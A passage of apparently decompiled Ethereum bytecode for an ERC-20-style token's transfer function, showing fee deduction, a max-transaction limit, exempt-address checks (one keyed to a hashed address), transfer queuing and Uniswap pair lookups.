                        require mem[_7120] == mem[_7120 + 12 len 20]
                        require ext_code.size(stor16)
                        staticcall stor16.WETH() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7186 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7218 = mem[_7186]
                        require mem[_7186] == mem[_7186 + 12 len 20]
                        mem[mem[64] + 4] = this.address
                        mem[mem[64] + 36] = address(_7218)
                        require ext_code.size(address(_7138))
                        staticcall address(_7138).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(_7218)
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7384 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7456 = mem[_7384]
                        require mem[_7384] == mem[_7384 + 12 len 20]
                        if mem[_7384 + 12 len 20] != msg.sender:
                            if stor6[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 6
                                if stor6[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _7824 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7824 + 32 len mem[_7824]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if msg.sender == address(_7456):
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor14:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                        else:
                            if stor6[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 6
                                if stor6[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _7856 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7856 + 32 len mem[_7856]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor6[address(arg1)]:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor14:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
    else:
        mem[32] = 6
        if not stor6[address(msg.sender)]:
            if stor14:
                require ext_code.size(stor16)
                staticcall stor16.factory() with:
                        gas gas_remaining wei
                mem[148] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                require ext_code.size(stor16)
                staticcall stor16.WETH() with:
                        gas gas_remaining wei
                mem[ceil32(return_data.size) + 148] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                mem[(2 * ceil32(return_data.size)) + 152] = this.address
                mem[(2 * ceil32(return_data.size)) + 184] = address(ext_call.return_data[0])
                require ext_code.size(address(ext_call.return_data[0]))
                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                        gas gas_remaining wei
                       args address(this.address), address(ext_call.return_data[0])
                mem[(2 * ceil32(return_data.size)) + 148] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                mem[64] = (4 * ceil32(return_data.size)) + 148
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                if ext_call.return_data[12 len 20] != msg.sender:
                    require ext_code.size(stor16)
                    staticcall stor16.factory() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(stor16)
                    staticcall stor16.WETH() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if arg1 == ext_call.return_data[12 len 20]:
                        if stor6[address(msg.sender)]:
                            if stor6[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor6[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if sha3(arg1) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if arg1 == this.address:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor6[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor14:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if not arg2:
                                require arg2 <= _maxTxAmount
                                require ext_code.size(stor16)
                                staticcall stor16.factory() with:
                                        gas gas_remaining wei
                                mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                require ext_code.size(stor16)
                                staticcall stor16.WETH() with:
                                        gas gas_remaining wei
                                       args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                                require ext_code.size(address(ext_call.return_data[0]))
                                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                        gas gas_remaining wei
                                       args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                if ext_call.return_data[12 len 20] == arg1:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2,
                                                  mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                stor15.length++
                                stor15[stor15.length].field_0 = arg1
                                stor15[stor15.length].field_256 = arg2
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2,
                                              mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                            else:
                                if arg2 and _fee > -1 / arg2:
                                    revert with 'NH{q', 17
                                if not arg2:
                                    revert with 'NH{q', 18
                                if arg2 * _fee / arg2 != _fee:
                                    revert with 0, 'SafeMath: multiplication overflow'
                                require arg2 <= _maxTxAmount
                                require ext_code.size(stor16)
                                staticcall stor16.factory() with:
                                        gas gas_remaining wei
                                mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                require ext_code.size(stor16)
                                staticcall stor16.WETH() with:
                                        gas gas_remaining wei
                                       args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                                require ext_code.size(address(ext_call.return_data[0]))
                                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                        gas gas_remaining wei
                                       args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                if ext_call.return_data[12 len 20] == arg1:
                                    if arg2 < arg2 * _fee / 100:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[0] += arg2 * _fee / 100
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 - (arg2 * _fee / 100),
                                                  mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    if arg2 * _fee / 100 > 0:
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2 * _fee / 100,
                                                      mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      0,
                                    return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                stor15.length++
                                stor15[stor15.length].field_0 = arg1
                                stor15[stor15.length].field_256 = arg2
                                if arg2 < arg2 * _fee / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[0] += arg2 * _fee / 100
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 - (arg2 * _fee / 100),
                                              mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                                if arg2 * _fee / 100 > 0:
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 * _fee / 100,
                                                  mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  0,
                            return 1, mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)]
                    require ext_code.size(stor16)
                    staticcall stor16.factory() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(stor16)
                    staticcall stor16.WETH() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if stor6[address(msg.sender)]:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if stor6[address(arg1)]:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if sha3(arg1) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if arg1 == this.address:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if ext_call.return_data[12 len 20] != msg.sender:
                        if msg.sender == address(ext_call.return_data[0]):
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
